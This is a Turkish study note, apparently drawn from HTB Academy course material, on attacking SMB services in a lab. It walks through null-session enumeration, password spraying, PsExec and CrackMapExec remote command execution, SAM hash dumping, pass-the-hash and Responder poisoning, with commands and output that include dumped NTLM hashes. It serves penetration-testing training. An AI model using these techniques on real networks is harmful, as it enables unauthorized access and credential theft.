---
{"dg-publish":true,"permalink":"/active-directory/attacking-common-services/"}
---



Başlangıçta SMB, NetBIOS ile TCP 139 ve UDP 137/138 portlarında çalışıyordu. Windows 2000 ile SMB, NetBIOS olmadan 445 portunda doğrudan TCP/IP üzerinden çalışmaya başladı. Günümüzde modern Windows sistemleri SMB'yi TCP üzerinden kullanırken, NetBIOS'u yedekleme amacıyla desteklemektedir.

Örneğin, Windows'ta SMB, TCP/IP üzerinden NetBIOS'a ihtiyaç duymadan doğrudan 445 TCP/IP portu üzerinden çalışabilir, ancak Windows'ta NetBIOS etkinse veya ==Windows olmayan bir hostu hedefliyorsak==, SMB'nin 139 TCP/IP portu üzerinde çalıştığını görürüz. Bu, SMB'nin TCP/IP üzerinden NetBIOS ile çalıştığı anlamına gelir.

SMB ile yaygın olarak ilişkili olan bir diğer protokol de [MSRPC'dir (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_RPC). RPC, bir uygulama geliştiricisine, iletişimi desteklemek için kullanılan ağ protokollerini anlamak zorunda kalmadan lokal veya remote bir proseste bir prosedürü (diğer bir deyişle bir fonksiyonu) çalıştırmak için genel bir yol sağlar, MS-RPCE'de belirtildiği gibi, SMB Protokolü üzerinden bir RPC tanımlar ve SMB Protokolü olarak adlandırılan pipe'ları temel taşıma olarak kullanabilir.

Bir SMB sunucusuna saldırmak için uygulama, işletim sistemi ve kullanılabilecek araçlar analiz edilmelidir. Yanlış yapılandırmalar, aşırı ayrıcalıklar ve güvenlik açıkları hedef alınabilir. SMB erişimi sağlandıktan sonra, paylaşılan dizin içeriği incelenmeli, NetBIOS veya RPC hedefleniyorsa alınabilecek bilgiler ve gerçekleştirilebilecek eylemler belirlenmelidir.


## Enumeration

SMB uygulaması ve işletim sistemine bağlı olarak, Nmap ile farklı bilgiler elde edilebilir. Windows hedeflerinde sürüm bilgileri genellikle doğrudan yer almaz; Nmap, işletim sistemini tahmin eder. Belirli bir istismara karşı savunmasızlık için ek taramalar gerekebilir. 

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

* SMB sürümü (Samba smbd 4.6.2)
* Host adı HTB
* İşletim Sistemi SMB uygulamasına dayalı Linux'tur

Bazı yaygın yanlış yapılandırmaları ve protokollere özgü saldırıları inceleyelim.

### Yanlış Yapılandırmalar

SMB, genellikle null oturum olarak adlandırılan kimlik doğrulama gerektirmeyecek şekilde yapılandırılabilir. Bunun yerine, bir sisteme kullanıcı adı veya parola olmadan giriş yapabiliriz.


#### Anonymous Authentication

Username ve password gerektirmeyen bir SMB sunucusu bulursak veya geçerli kimlik bilgileri bulursak, paylaşımların, kullanıcı adlarının, grupların, izinlerin, politikaların, servislerin vb. bir listesini alabiliriz. SMB ile etkileşime giren çoğu araç, smbclient, smbmap, rpcclient veya enum4linux dahil olmak üzere null oturum bağlantısına izin verir. Şimdi null kimlik doğrulaması kullanarak dosya paylaşımları ve RPC ile nasıl etkileşim kurabileceğimizi inceleyelim.


#### File Share

smbclient kullanarak, -L seçeneği ile sunucunun paylaşımlarının bir listesini görüntüleyebilir ve -N seçeneğini kullanarak smbclient'a null oturumunu kullanmasını söyleyebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

Smbmap, ağ paylaşımlarını numaralandırmamıza ve ilişkili izinlere erişmemize yardımcı olan başka bir araçtır. `Smbmap'in bir avantajı, her paylaşılan klasör için izinlerin bir listesini sağlamasıdır.`

```shell-session
M1R4CKCK@htb[/htb]$ smbmap -H 10.129.14.128
```

![Pasted image 20241226220901.png](/img/user/resimler/Pasted%20image%2020241226220901.png)

smbmap'i -r veya -R ( recursive) seçeneği ile kullanarak dizinlere göz atabilirsiniz:

```shell-session
smbmap -H 10.129.14.128 -r notes
```


![Pasted image 20241226220838.png](/img/user/resimler/Pasted%20image%2020241226220838.png)

Yukarıdaki örnekte, izinler dosyaları yüklemek ve indirmek için kullanılabilecek READ (OKU) ve WRITE (YAZ) olarak ayarlanmıştır.

```shell-session
M1R4CKCK@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

```shell-session
M1R4CKCK@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```


#### Remote Procedure Call (RPC)

Bir workstation veya Domain Controller'ı numaralandırmak için null session ile rpcclient aracını kullanabiliriz.

rpcclient aracı, bilgi toplamak veya kullanıcı adı gibi sunucu özelliklerini değiştirmek için SMB sunucusunda belirli fonksiyonları çalıştırmak üzere bize birçok farklı komut sunar. SANS Enstitüsü'nün bu cheat sheet'ini kullanabilir veya [rpcclient'ın man](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) sayfasında bulunan tüm bu fonksiyonların tam listesini inceleyebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

Enum4linux, null oturumları destekleyen başka bir yardımcı programdır ve SMB hedeflerinden bazı yaygın numaralandırmaları otomatikleştirmek için nmblookup, net, rpcclient ve smbclient kullanır:

[Orijinal araç](https://github.com/CiscoCXSecurity/enum4linux) Perl'de yazılmış ve Mark Lowe tarafından [Python](https://github.com/cddmp/enum4linux-ng)'da yeniden yazılmıştır.

```shell-session
M1R4CKCK@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```


## Protocol Specifics Attacks

Null oturum etkin değilse, SMB protokolü ile etkileşime geçmek için kimlik bilgilerine ihtiyacımız olacaktır. Kimlik bilgilerini elde etmenin iki yaygın yolu ise [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) ve [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack)'dir.

Brute-forcing, bir hesaba çok sayıda parola denemesi yapmayı içerir, ancak hesap kilitlenmelerine neden olabileceği için dikkatli olunmalıdır. Bu yöntem, hesap kilitleme eşikleri bilinmiyorsa önerilmez.

**Password spraying**, kilitlenme riskini azaltmak için daha iyi bir alternatiftir. Bu yöntemde, birçok kullanıcı adıya karşı ortak bir parola denenir. Kilitlenme eşiği biliniyorsa, birden fazla parola denemesi yapılabilir ve genellikle 30-60 dakikalık aralar güvenlidir.

**CrackMapExec (CME)**, password spraying için kullanılan bir araçtır. Bir IP'ye karşı password spraying gerçekleştirmek için:

- Kullanıcı listesi dosyasını belirtmek için `-u` seçeneği,
- Parolayı belirtmek için `-p` seçeneği kullanılır.  
    
Bu komut, belirtilen parolayı kullanarak listedeki her kullanıcıyı doğrular.

```shell-session
M1R4CKCK@htb[/htb]$ cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

Not: Varsayılan olarak CME başarılı bir oturum açma bulunduktan sonra çıkacaktır. `Continue-on-success` bayrağını kullanmak, geçerli bir parola bulunduktan sonra bile spraying'e devam edecektir. büyük bir kullanıcı listesine karşı tek bir password spraying için çok kullanışlıdır. ==Ek olarak, domain'e bağlı olmayan bir bilgisayarı hedefliyorsak,== --local-auth seçeneğini kullanmamız gerekecektir.

Daha ayrıntılı kullanım talimatları için aracın [dokümantasyon](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials) kılavuzuna göz atın.


#### SMB

Linux ve Windows SMB sunucuları farklı saldırı yolları sağlar. Genellikle, bu bölümün ilerleyen kısımlarında tartışacağımız gibi, Linux ortamında yalnızca dosya sistemine erişebilir, ayrıcalıkları kötüye kullanabilir veya bilinen güvenlik açıklarından faydalanabiliriz. Ancak Windows'ta saldırı yüzeyi daha önemlidir.

Bir Windows SMB Sunucusuna saldırırken, eylemlerimiz tehlikeye atmayı başardığımız kullanıcı üzerinde sahip olduğumuz ayrıcalıklarla sınırlı olacaktır. Bu kullanıcı bir Administrator ise veya belirli ayrıcalıklara sahipse, aşağıdaki gibi işlemleri gerçekleştirebileceğiz:

* Remote Command Execution
* SAM Veritabanından Hash'leri Çıkarma
* Oturum Açmış Kullanıcıları Numaralandırma
* Pass-the-Hash (PTH)

Bu tür işlemleri nasıl gerçekleştirebileceğimizi tartışalım. Ek olarak, SMB protokolünün, ayrıcalıkları yükseltmek veya bir ağa erişim sağlamak için bir yöntem olarak bir kullanıcının hash'ini almak için nasıl kötüye kullanılabileceğini öğreneceğiz.


#### Remote Code Execution (RCE)

SMB kullanarak remote bir sistemde nasıl komut çalıştırılacağına geçmeden önce, Sysinternals hakkında konuşalım. Windows Sysinternals web sitesi 1996 yılında Mark Russinovich ve Bryce Cogswell tarafından bir Microsoft Windows ortamını yönetmek, teşhis etmek, sorun gidermek ve izlemek için teknik kaynaklar ve yardımcı programlar sunmak amacıyla oluşturulmuştur. Microsoft, 18 Temmuz 2006 tarihinde Windows Sysinternals'ı ve varlıklarını satın almıştır.

Sysinternals, Microsoft Windows çalıştıran bilgisayarları yönetmek ve izlemek için çeşitli ücretsiz araçlar içeriyordu. Bu yazılımlar artık Microsoft web sitesinde bulunabilir. Remote sistemleri yönetmek için kullanılan bu ücretsiz araçlardan biri [PsExec](https://docs.microsoft.com/en-us/sysinternals/)'tir.

PsExec, başka sistemlerde **process** çalıştırmamıza olanak tanıyan bir araçtır ve **console application**'lar için tam etkileşimli bir deneyim sunar. Bu işlem için **client software**'i manuel olarak yüklememiz gerekmez. PsExec, **Windows service image** dosyasını kendi **executable** dosyası içerisinde barındırır.

Bu service, varsayılan olarak remote makinedeki **admin$ share** yoluna aktarılır. Daha sonra **DCE/RPC interface**'ini **SMB** üzerinden kullanarak **Windows Service Control Manager API**'ye erişir. PsExec, remote makinede bir **PSExec service** başlatır ve bu hizmet, sisteme komut gönderebilecek bir **named pipe** oluşturur.

### PsExec ve SMB İlişkisi:

- **SMB Protokolü:** PsExec, **SMB** üzerinden admin$ paylaşıma bağlanır.
- **File Deployment:** PsExec, çalıştıracağı hizmet dosyasını (service image) admin$ share yoluyla hedef sisteme kopyalar.
- **Privilege Dependency:** Bu işlem için, PsExec kullanıcısının hedef makinedeki **administrative privileges**'e sahip olması gerekir.

PsExec'i Microsoft web sitesinden indirebilir veya bazı Linux uygulamalarını kullanabiliriz:

* [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - [RemComSvc](https://github.com/kavika13/RemCom) kullanan Python PsExec benzeri fonksiyon örneği.
* [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - RemComSvc kullanmadan PsExec'e benzer bir yaklaşım. Teknik burada açıklanmıştır. Bu uygulama bir adım daha ileri giderek komutların çıktısını almak için lokal bir SMB sunucusu oluşturur. Bu, hedef makinenin yazılabilir bir paylaşıma sahip OLMADIĞI durumlarda kullanışlıdır.
* [Impacket atexec ](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)- Bu örnek, Task Scheduler servisi aracılığıyla hedef makinede bir komut çalıştırır ve çalıştırılan komutun çıktısını döndürür.
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - smbexec ve atexec'in bir uygulamasını içerir.
* [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec uygulaması.


#### Impacket PsExec

impacket-psexec'i kullanmak için hedef makinemizin domain/kullanıcı adını, şifresini ve IP adresini vermemiz gerekir. Daha detaylı bilgi için impacket help'i kullanabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ impacket-psexec -h

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)

optional arguments:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve
                        it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target
```

**Local user**, bir sistemde yalnızca o makine için oluşturulmuş, başka bir sistem veya domain tarafından yönetilmeyen bir kullanıcı hesabıdır.

```shell-session
M1R4CKCK@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

Aynı seçenekler impacket-smbexec ve impacket-atexec için de geçerlidir.


#### CrackMapExec

- CrackMapExec ile birden fazla host üzerinde aynı anda komut çalıştırılabilir.
- Çalıştırılacak protokol belirtilmelidir (örneğin, smb).
- Hedef olarak tek bir IP adresi veya IP adres aralığı girilebilir (örneğin, 192.168.1.0/24).
- Kullanıcı adı için `-u`, parola için `-p` seçeneği kullanılır.
- CMD komutlarını çalıştırmak için `-x` seçeneği kullanılır.
- PowerShell komutlarını çalıştırmak için büyük harf `-X` seçeneği kullanılır.


```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

- `-x 'whoami'`: **CMD komutu**. Bu parametre, hedef makinede **CMD** üzerinden `'whoami'` komutunun çalıştırılmasını sağlar. Bu komut, bağlanan kullanıcının kimliğini (kullanıcı adını) gösterir.
    
- `--exec-method smbexec`: **Yürütme yöntemi**. Bu parametre, komutun remote makinede çalıştırılması için **smbexec** yöntemini kullanır. **Smbexec**, SMB protokolü üzerinden remote komut çalıştırmak için kullanılan bir tekniktir. Bu yöntem, daha fazla güvenlik kontrolüne tabi olabilir, ancak bazı sistemlerde SMBexec yöntemi daha işlevsel olabilir.

Not: Eğer --exec-metodu tanımlanmamışsa, CrackMapExec atexec metodunu çalıştırmayı deneyecektir, eğer başarısız olursa --exec-metodu smbexec'i belirtmeyi deneyebilirsiniz.


#### Enumerating Logged-on Users

Birden fazla makinenin bulunduğu bir ağda olduğumuzu düşünün. Bazıları aynı lokal administrator hesabını paylaşıyor. Bu durumda, 10.10.110.17/24 ağındaki tüm makinelerde oturum açmış kullanıcıları numaralandırmak için CrackMapExec'i kullanabiliriz, bu da numaralandırma işlemimizi hızlandırır.

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

---

"**Bazıları aynı lokal administrator hesabını paylaşıyor**" ifadesi, birden fazla makinenin üzerinde **aynı lokal administrator hesabı** (örneğin, `Administrator`) ve bu hesaba ait **aynı parola** kullanıldığı anlamına gelir. Yani, ağdaki birden fazla sistemde **kullanıcı adı** ve **parola** aynı olup, bu makineler üzerinde aynı administrator yetkilerine sahip bir hesap bulunur.

Bu durumun örnek anlamı şu şekilde olabilir:

- 10.10.110.17/24 ağındaki bazı bilgisayarlar, **Administrator** kullanıcısının parolasını aynı tutar.
- Bu bilgisayarlar, her birinde farklı makineler olsa da, **local administrator** hesabı aynı kullanıcı adı ve şifreyi paylaşır.

Bu gibi durumlar, **CrackMapExec** gibi araçlarla ağda hızlıca numaralandırma yapmayı kolaylaştırır çünkü **kullanıcı adı** ve **parola** aynı olduğu için tek bir kimlik bilgisiyle birçok makinede oturum açılabilir. Bu, birden fazla makineyi aynı anda test etmek ve erişim sağlamak için büyük bir avantaj sağlar.

---


### SAM Veritabanından Hash'leri Çıkarma

Security Account Manager (SAM), kullanıcıların parolalarını saklayan bir veritabanı dosyasıdır. Lokal ve remote kullanıcıların kimliklerini doğrulamak için kullanılabilir. Bir makinede administrative ayrıcalıklarına sahip olursak, SAM veritabanı hash'lerini farklı amaçlar için çıkarabiliriz:

* Başka bir kullanıcı olarak kimlik doğrulama.
* Parola Cracking, parolayı kırmayı başarırsak, parolayı diğer servisler veya hesaplar için yeniden kullanmayı deneyebiliriz.
* Pass The Hash. 

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```


#### Pass-the-Hash (PtH)

Bir kullanıcının NTLM hash'ini elde etmeyi başarırsak ve bunu kıramazsak, Pass-the-Hash (PtH) adı verilen bir teknikle SMB üzerinden kimlik doğrulaması yapmak için hash'i kullanabiliriz. PtH, bir saldırganın düz metin parolası yerine bir kullanıcının parolasının temel NTLM hash'ini kullanarak remote bir sunucu veya hizmette kimlik doğrulaması yapmasına olanak tanır. PtH saldırısını diğer araçların yanı sıra herhangi bir Impacket aracı, SMBMap, CrackMapExec ile kullanabiliriz. İşte bunun CrackMapExec ile nasıl çalışacağına dair bir örnek:

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```


#### Forced Authentication Attacks

Ayrıca kullanıcıların [NetNTLM v1/v2 hash'lerini](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) yakalamak için sahte bir SMB Sunucusu oluşturarak SMB protokolünü kötüye kullanabiliriz.

En yaygın kullanılan araçlardan biri **Responder**'dır. Responder, **LLMNR**, **NBT-NS** ve **MDNS** poisoner  bir araçtır ve çeşitli yeteneklere sahiptir. Bunlardan biri, **SMB** dahil sahte servisler kurarak **NetNTLM v1/v2** hash'lerini çalmaktır. Varsayılan yapılandırmasında, **LLMNR** ve **NBT-NS** trafiğini tespit eder. Ardından, kurbanın aradığı sunucular adına yanıt verir ve onların **NetNTLM** hash'lerini yakalar.

```shell-session
M1R4CKCK@htb[/htb]$ responder -I <interface name>
```

Bir kullanıcı veya sistem Name Resolution (NR) gerçekleştirmeye çalıştığında, bir hostun IP adresini host adına göre almak için bir makine tarafından bir dizi prosedür yürütülür. Host adı Windows makinelerde kabaca aşağıdaki gibi olacaktır:

* Host adı dosya paylaşımının IP adresi gereklidir.
* Lokal host dosyası (C:\Windows\System32\Drivers\etc\hosts) uygun kayıtlar için kontrol edilir.
* Hiçbir kayıt bulunamazsa, makine en son çözümlenen adların kaydını tutan yerel DNS cache'e geçer.
* Lokal DNS kaydı yok mu? Yapılandırılmış olan DNS sunucusuna bir sorgu gönderilir.
* Her şey başarısız olursa, makine ağdaki diğer makinelerden dosya paylaşımının IP adresini isteyen bir çok noktaya yayın sorgusu yayınlar.

Bir kullanıcının paylaşılan bir klasörün adını `\\mysharedfolder\` yerine `\\mysharefoder\` olarak yanlış yazdığını varsayalım. Bu durumda, isim mevcut olmadığı için tüm name resolutions başarısız olacaktır ve makine, sahte SMB sunucumuzu çalıştıran biz de dahil olmak üzere ağdaki tüm cihazlara çok noktaya yayın sorgusu gönderecektir. Bu bir sorundur çünkü yanıtların bütünlüğünü doğrulamak için hiçbir önlem alınmaz. Saldırganlar bu tür sorguları dinleyerek ve yanıtları taklit ederek bu mekanizmadan yararlanabilir ve kurbanın kötü niyetli sunucuların güvenilir olduğuna inanmasına neden olabilir. Bu güven genellikle kimlik bilgilerini çalmak için kullanılır.

```shell-session
M1R4CKCK@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

Yakalanan bu kimlik bilgileri hashcat kullanılarak kırılabilir veya kimlik doğrulamayı tamamlamak ve kullanıcıyı taklit etmek için remote bir host'a aktarılabilir.

